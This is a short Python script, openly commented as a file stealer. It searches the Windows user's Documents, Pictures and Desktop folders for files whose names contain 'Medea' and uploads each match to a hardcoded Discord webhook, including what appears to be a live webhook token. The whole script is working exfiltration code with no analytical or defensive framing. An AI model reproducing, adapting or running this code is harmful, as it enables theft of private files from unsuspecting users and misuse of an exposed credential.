from discord_webhook import DiscordWebhook
import getpass
import os
# manages needed imports


target_paths = [f"C:\\Users\\{getpass.getuser()}\\Documents", f"C:\\Users\\{getpass.getuser()}\\Pictures", f"C:\\Users\\{getpass.getuser()}\\Desktop"]
contains = ["Medea"]
webhook_url = "https://discord.com/api/webhooks/808956790133358613/1bSfMJu0EMt0X2z4tyzHgphBZBdAFlirjq_Da-ZYY-b-yTKQRJ3XHce9et-orzEVSq_L"
# variables to define which files to steal, and the webhook to send them to


def send_file(root, name):  # sends files via the discord webhook
    webhook = DiscordWebhook(url=webhook_url)

    with open(os.path.join(root, name), "rb") as f:  # embeds file in webhook
        webhook.add_file(file=f.read(), filename=name)
    
    response = webhook.execute()


for exec_path in target_paths:  # searches for files in all specified locations
    for root, dirs, files in os.walk(exec_path):
        for name in files:
            execute = False

            for test_in in contains:  # tests if the file name contains desired information
                if test_in in name:
                    execute = True
            
            if execute:  # if the file name does contain desired information, an attempt is made to send it through the webhook
                send_file(root, name)